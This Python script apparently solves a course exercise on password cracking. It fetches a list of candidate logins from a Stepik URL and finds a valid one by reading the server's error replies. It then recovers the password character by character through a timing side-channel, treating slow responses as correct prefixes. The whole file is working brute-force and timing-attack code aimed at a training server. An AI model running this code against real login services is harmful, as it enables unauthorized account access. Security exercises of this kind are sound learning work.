import socket
import sys
import string
import requests
import json
import time

char_num = string.ascii_letters + string.digits + string.punctuation
args = sys.argv  # we get the list of arguments
hostname = args[1]
port = int(args[2])
client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)
admins = requests.get('https://stepik.org/media/attachments/lesson/255258/logins.txt').content.decode('utf-8')
file = admins.split("\r\n")
login = ''
for admin in file:
    admin = admin.strip('\n')
    login_dict = {"login": admin, "password": " "}
    json_str = json.dumps(login_dict)
    client_socket.send(json_str.encode())
    response = client_socket.recv(1024).decode()
    if response == '{"result": "Wrong password!"}' or response == '{"result": "Exception happened during login"}':
        login = admin
        break
password = ''
for i in range(12):
    for char in char_num:
        trial_password = password + char
        login_dict = {"login": login, "password": trial_password}
        json_str = json.dumps(login_dict)
        start = time.perf_counter()
        client_socket.send(json_str.encode())
        response = client_socket.recv(1024).decode()
        final = time.perf_counter()
        if (final - start) >= 0.090000:
            password = trial_password
            break
        elif response == '{"result": "Connection success!"}':
            print(json_str)
            exit()
client_socket.close()
